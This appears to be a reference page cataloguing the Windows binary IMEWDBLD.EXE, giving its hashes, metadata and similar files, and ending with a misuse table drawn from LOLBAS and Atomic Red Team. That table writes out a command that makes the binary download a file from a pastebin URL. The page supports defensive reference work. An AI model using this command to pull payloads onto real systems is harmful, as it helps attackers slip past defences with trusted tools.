---
title: IMEWDBLD.EXE | Microsoft IME Open Extended Dictionary Module
excerpt: What is IMEWDBLD.EXE?
---

# IMEWDBLD.EXE 

* File Path: `C:\windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE`
* Description: Microsoft IME Open Extended Dictionary Module

## Screenshot

![IMEWDBLD.EXE](screenshots/IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.png)

## Hashes

Type | Hash
-- | --
MD5 | `8EDFF2D1145341D7B23D012B29910539`
SHA1 | `5F5E3CE0CB5867A4DC9479E54C848A85C359CBD5`
SHA256 | `8D02BEA0CFF00135CF8F752332A0724EB121330FE0C5B32099003CD178AA301C`
SHA384 | `2CA335235B3B69CEF1310D79C140CF26C3E1520DB41744FAC997403C85E5B4461B651614627A6416E32E00D6C18FDD43`
SHA512 | `E6F5E485C1A23AA3FCE6E4575D47CCD0408C2834DE297DFEE3C41BC644593CD83937D5661C0628F465166A29CB7E8CB66E2E49ACBDA83D646FFDC8512FFEE340`
SSDEEP | `6144:Kjjvu06N3PcGhmmcXe7z0asJrB1v49zNWdoJwFTFSR/OjFC7Gs/UEVTppZQ1ZDLG:Kjy0SoO3sJ954uoSoIC7Gs/rz`

## Signature

* Status: The file C:\windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: imewdbld.exe
* Product Name: Microsoft IME 2012
* Company Name: Microsoft Corporation
* File Version: 15.0.9600.18514
* Product Version: 15.0.9600.18514
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\WINDOWS\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-77CB1EF779047326258ABC9463F8C290.md) | 27
[C:\Windows\system32\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-8B8C8F73B4E96963DD9A6E760C5F77DD.md) | 32
[C:\WINDOWS\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.md) | 32
[C:\Windows\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-FBEE6DD18640B1575FF98D1EB3B51724.md) | 29
[C:\Windows\SysWOW64\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-0984D217E10D11B2DBB8CCD47CDF36BD.md) | 32
[C:\WINDOWS\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-1C59A3B1176433281CEDA631F8D5D3EC.md) | 35
[C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-40FBB367D0F83472C170359D6E3446A0.md) | 33
[C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-B840116C2D5805095F46CFD8ACBD0EB8.md) | 29
[C:\WINDOWS\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-F042BFE4E2BE1EF592D9CFA14F8E6BD1.md) | 29

## Possible Misuse

*The following table contains possible examples of `IMEWDBLD.EXE` being misused. While `IMEWDBLD.EXE` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Name: IMEWDBLD.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #17 - Download a file with IMEWDBLD.exe](#atomic-test-17---download-a-file-with-imewdbldexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #17 - Download a file with IMEWDBLD.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


